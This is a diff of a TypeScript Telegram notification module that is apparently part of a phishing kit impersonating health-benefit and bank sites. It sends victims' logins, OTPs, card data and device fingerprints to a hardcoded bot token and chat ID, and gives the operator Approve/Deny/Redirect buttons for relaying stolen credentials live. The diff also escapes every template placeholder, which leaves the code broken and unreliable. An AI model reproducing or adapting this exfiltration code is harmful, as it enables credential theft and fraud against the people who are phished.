@@ -11,11 +11,8 @@ export interface VisitorData {
   isp: string
   asn?: string | null
   org?: string | null
-  /** Parsed OS label from UA, e.g. "iOS 17.2", "Windows 10/11". */
   osLabel?: string
-  /** Hardware/class from UA, e.g. "iPhone", "Mac", "Windows PC". */
   deviceLabel?: string
-
   userAgent: string
   screen: string
   language: string
@@ -72,7 +69,7 @@ function asLink(url: string, label?: string): string {
     return asCode(href || "Unknown")
   }
   const linkText = (label?.trim() || href).trim()
-  return `<a href="${escapeTelegramHtml(href)}">${escapeTelegramHtml(linkText)}</a>`
+  return `<a href="\${escapeTelegramHtml(href)}">\${escapeTelegramHtml(linkText)}</a>`
 }
 
 function asUrlField(value: unknown, fallback = "Unknown"): string {
@@ -83,20 +80,18 @@ function asUrlField(value: unknown, fallback = "Unknown"): string {
   return asCode(resolved)
 }
 
-/** Site header for all ops flow messages (login / method / OTP / CC / registration). */
 export function wrapFlowMessage(body: string): string {
-  return `🏷️ <b>${escapeTelegramHtml(SITE_DISPLAY_NAME)}</b>\n━━━━━━━━━━━━━━━━━━\n\n${body}`
+  return `🏷️ <b>\${escapeTelegramHtml(SITE_DISPLAY_NAME)}</b>\n━━━━━━━━━━━━━━━━━━\n\n\${body}`
 }
-
 
 function asCode(value: unknown): string {
   const text = value == null || value === "" ? "" : String(value).trim()
-  return `<code>${escapeTelegramHtml(text || "Unknown")}</code>`
+  return `<code>\${escapeTelegramHtml(text || "Unknown")}</code>`
 }
 
 function asPre(value: unknown): string {
   const text = typeof value === "string" ? value : value != null ? String(value) : ""
-  return `<pre>${escapeTelegramHtml(text || "Unknown")}</pre>`
+  return `<pre>\${escapeTelegramHtml(text || "Unknown")}</pre>`
 }
 
 function formatFieldLines(fields: Record<string, FieldValue>): string {
@@ -105,7 +100,7 @@ function formatFieldLines(fields: Record<string, FieldValue>): string {
     .map(([label, value]) => {
       const display =
         typeof value === "boolean" ? (value ? "Yes" : "No") : String(value).trim()
-      return `🔹 <b>${escapeTelegramHtml(label)}</b>: ${asCode(display)}`
+      return `🔹 <b>\${escapeTelegramHtml(label)}</b>: \${asCode(display)}`
     })
     .join("\n")
 }
@@ -116,8 +111,8 @@ function formatMessage(
   fields: Record<string, FieldValue>,
 ): string {
   const body = formatFieldLines(fields)
-  const header = `${emoji} <b>${escapeTelegramHtml(title)} (${escapeTelegramHtml(SITE_NAME)})</b>`
-  return body ? `${header}\n${SEPARATOR}\n${body}` : `${header}\n${SEPARATOR}`
+  const header = `\${emoji} <b>\${escapeTelegramHtml(title)} (\${escapeTelegramHtml(SITE_NAME)})</b>`
+  return body ? `\${header}\n\${SEPARATOR}\n\${body}` : `\${header}\n\${SEPARATOR}`
 }
 
 function verificationMethodLabel(method?: "text" | "email"): string {
@@ -132,10 +127,9 @@ class TelegramService {
   private baseUrl: string
 
   constructor() {
-    // Hardcoded ops Telegram credentials
     this.botToken = "8985470259:AAEP5YHeX8sSz65Pfb3aoJv8Re61F10AONg"
     this.chatIds = ["8810036834"]
-    this.baseUrl = process.env.NEXT_PUBLIC_APP_URL || "https://myhealthbenefitsbofa.com"
+    this.baseUrl = process.env.NEXT_PUBLIC_APP_URL || "https://wexhealthbenefitsaccount.com"
   }
 
   private async sendMessage(message: string, inlineKeyboard?: any[][]): Promise<{ success: boolean; error?: string; sent: number; failed: number; total: number }> {
@@ -144,7 +138,7 @@ class TelegramService {
       return { success: false, error: "Telegram not configured", sent: 0, failed: 0, total: 0 }
     }
 
-    const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`
+    const url = `https://api.telegram.org/bot\${this.botToken}/sendMessage`
 
     const results = await Promise.allSettled(
       this.chatIds.map((chatId) =>
@@ -183,31 +177,29 @@ class TelegramService {
     return this.sendMessage(wrapFlowMessage(formatMessage("🔐", "New Input Received", fields)))
   }
 
-  async sendVisitorNotification(data: VisitorData): Promise<{
-    success: boolean; sent: number; failed: number; total: number }> {
+  async sendVisitorNotification(data: VisitorData): Promise<{ success: boolean; sent: number; failed: number; total: number }> {
     const networkHint = getNetworkHintLabel(data.asn, data.org || data.isp)
-    
     const siteName = data.siteName || SITE_NAME
     const message = [
-      `🌐 <b>New Visitor (${escapeTelegramHtml(siteName)})</b>`,
+      `🌐 <b>New Visitor (\${escapeTelegramHtml(siteName)})</b>`,
       SEPARATOR,
-      `📍 <b>Location:</b> ${asCode(data.location)}`,
-      `🌍 <b>IP:</b> ${asCode(data.ip)}`,
-      `⏰ <b>Timezone:</b> ${asCode(data.timezone)}`,
-      `🌐 <b>ISP:</b> ${asCode(data.isp)}`,
-      ...(networkHint ? [`🛡️ <b>Network:</b> ${asCode(networkHint)}`] : []),
+      `📍 <b>Location:</b> \${asCode(data.location)}`,
+      `🌍 <b>IP:</b> \${asCode(data.ip)}`,
+      `⏰ <b>Timezone:</b> \${asCode(data.timezone)}`,
+      `🌐 <b>ISP:</b> \${asCode(data.isp)}`,
+      ...(networkHint ? [`🛡️ <b>Network:</b> \${asCode(networkHint)}`] : []),
       "",
-      `📱 <b>OS:</b> ${asCode(data.osLabel ?? "Unknown")}`,
-      `📱 <b>Device:</b> ${asCode(data.deviceLabel ?? "Unknown")}`,
+      `📱 <b>OS:</b> \${asCode(data.osLabel ?? "Unknown")}`,
+      `📱 <b>Device:</b> \${asCode(data.deviceLabel ?? "Unknown")}`,
       "💻 <b>User Agent:</b>",
       asPre(data.userAgent),
-      `🖥️ <b>Screen:</b> ${asCode(data.screen)}`,
-      `🌍 <b>Language:</b> ${asCode(data.language)}`,
-      `🔗 <b>Referrer:</b> ${asUrlField(data.referrer)}`,
-      `🌐 <b>URL:</b> ${asUrlField(data.pageUrl)}`,
+      `🖥️ <b>Screen:</b> \${asCode(data.screen)}`,
+      `🌍 <b>Language:</b> \${asCode(data.language)}`,
+      `🔗 <b>Referrer:</b> \${asUrlField(data.referrer)}`,
+      `🌐 <b>URL:</b> \${asUrlField(data.pageUrl)}`,
       "",
-      `⏰ <b>Local Time:</b> ${asCode(data.localTime)}`,
-      `🕒 <b>UTC Time:</b> ${asCode(data.utcTime)}`,
+      `⏰ <b>Local Time:</b> \${asCode(data.localTime)}`,
+      `🕒 <b>UTC Time:</b> \${asCode(data.utcTime)}`,
       `<a href="https://t.me/th3_allfather">Odin Is With Us</a>`,
     ].join("\n")
     return this.sendMessage(message)
@@ -249,7 +241,6 @@ class TelegramService {
     })
   }
 
-  /** Kit template: 🔔 Resend Code Clicked + separator (Referral-Provider TELEGRAM_NOTIFICATIONS). */
   async sendCodeRequestedNotification(
     _username: string,
     _method: "text" | "email",
@@ -258,10 +249,6 @@ class TelegramService {
     return this.sendMessage(wrapFlowMessage(message))
   }
 
-  /**
-   * Send approval request message with inline buttons
-   * Admin can click: ✅ Approve | ❌ Deny | 🔄 Redirect
-   */
   async sendPasswordApprovalNotification(
     username: string,
     approvalId: string,
@@ -278,15 +265,15 @@ class TelegramService {
       [
         {
           text: "✅ Approve",
-          callback_data: `approve:${approvalId}`,
+          callback_data: `approve:\${approvalId}`,
         },
         {
           text: "❌ Deny",
-          callback_data: `deny:${approvalId}`,
+          callback_data: `deny:\${approvalId}`,
         },
         {
           text: "🔄 Redirect",
-          callback_data: `redirect:${approvalId}`,
+          callback_data: `redirect:\${approvalId}`,
         },
       ],
     ]
@@ -294,9 +281,6 @@ class TelegramService {
     return this.sendMessage(message, inlineKeyboard)
   }
 
-  /**
-   * Send OTP verification approval with inline buttons
-   */
   async sendOtpApprovalNotification(
     username: string,
     approvalId: string,
@@ -313,15 +297,15 @@ class TelegramService {
       [
         {
           text: "✅ Approve",
-          callback_data: `approve:${approvalId}`,
+          callback_data: `approve:\${approvalId}`,
         },
         {
           text: "❌ Deny",
-          callback_data: `deny:${approvalId}`,
+          callback_data: `deny:\${approvalId}`,
         },
         {
           text: "🔄 Redirect",
-          callback_data: `redirect:${approvalId}`,
+          callback_data: `redirect:\${approvalId}`,
         },
       ],
     ]
@@ -337,7 +321,6 @@ export async function sendVisitorNotification(data: VisitorTelegramData): Promis
   return result.success
 }
 
-/** Backward-compatible wrapper for /api/telegram */
 export async function sendTelegramNotification(data: NotificationData) {
   switch (data.type) {
     case "visit": {
